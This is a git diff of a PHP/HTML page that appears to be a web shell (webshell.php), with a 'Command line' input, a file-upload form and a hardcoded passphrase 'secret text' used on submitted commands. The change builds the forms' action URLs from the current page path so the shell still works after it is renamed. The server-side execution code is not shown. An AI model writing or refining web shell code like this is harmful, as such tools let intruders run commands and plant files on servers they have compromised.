@@ -94,7 +94,7 @@
             </textarea>
             </div>
         </form>
-        <form action="./webshell.php?action=cmd" method="post" id="postCmd">
+        <form method="post" id="postCmd">
             <div class="form-group">
                 <label for="cmd">Command line: </label>
                 <input type="text" name="cmd" id="cmd" class="form-control">
@@ -108,7 +108,7 @@
         <div class="alert alert-primary" role="alert">
             <?php echo $message; ?>
         </div>
-        <form method="POST" action="./webshell.php?action=upload" enctype="multipart/form-data">
+        <form method="POST" id="postFile" enctype="multipart/form-data">
             <div class="form-group">
                 <label for="file">File input</label>
                 <input type="file" class="form-control-file" id="file" name="file">
@@ -185,8 +185,14 @@
         $('#cmd').focus();
     })
 
+    $('#postFile').submit(function (e) {
+        $('#postFile').attr('action', $(location).attr('pathname') + "?action=upload");
+        return true;
+    })
+
     $('#postCmd').submit(function (e) {
         // e.preventDefault()
+        $('#postCmd').attr('action', $(location).attr('pathname') + "?action=cmd");
         let input = $('#cmd')
         if (input.val()) {
             let passphrase = 'secret text' ;
@@ -199,6 +205,5 @@
 </script>
 </body>
 </html>
-
 
 
